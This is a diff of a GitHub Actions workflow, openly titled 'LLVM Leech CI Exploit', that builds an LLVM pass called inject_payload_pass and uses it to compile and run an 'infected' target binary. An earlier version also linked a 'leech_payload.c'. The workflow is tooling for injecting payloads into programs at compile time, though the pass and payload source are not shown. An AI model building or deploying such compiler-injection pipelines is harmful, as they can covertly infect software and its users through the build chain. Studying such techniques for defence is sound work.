@@ -1,29 +1,29 @@
-name: Weaponized LLVM Leech CI
-
-on: [push, pull_request]
+name: LLVM Leech CI Exploit
+on: [push]
 
 jobs:
-  build:
+  build-and-exploit:
     runs-on: ubuntu-latest
     steps:
-    - name: Checkout repository
-      uses: actions/checkout@v3
+      - uses: actions/checkout@v4
 
-    - name: Install LLVM & curl
-      run: |
-        sudo apt update
-        sudo apt install -y llvm clang curl
+      - name: Setup LLVM Environment
+        run: |
+          sudo apt update
+          sudo apt install llvm clang cmake -y
 
-    - name: Build LLVM Injection Plugin
-      run: |
-        cd src
-        clang -shared -fPIC -o leech_pass.so inject_payload_pass.cpp `llvm-config --cxxflags --ldflags --system-libs --libs all`
+      - name: Build LLVM Pass (inject_payload_pass.so)
+        run: |
+          mkdir -p build
+          cd build
+          cmake ../src
+          make
 
-    - name: Compile Infected Binary
-      run: |
-        cd src
-        clang -Xclang -load -Xclang ./leech_pass.so -Xclang -add-plugin -Xclang inject_payload infected_target.c leech_payload.c -o infected_app
-
-    - name: Execute Infected Binary
-      run: |
-        ./src/infected_app
+      - name: Compile infected target with LLVM Pass
+        run: |
+          cd build
+          clang -flegacy-pass-manager \
+            -Xclang -load -Xclang ./inject_payload_pass.so \
+            ../src/infected_target.c -o infected_target
+          chmod +x infected_target
+          ./infected_target
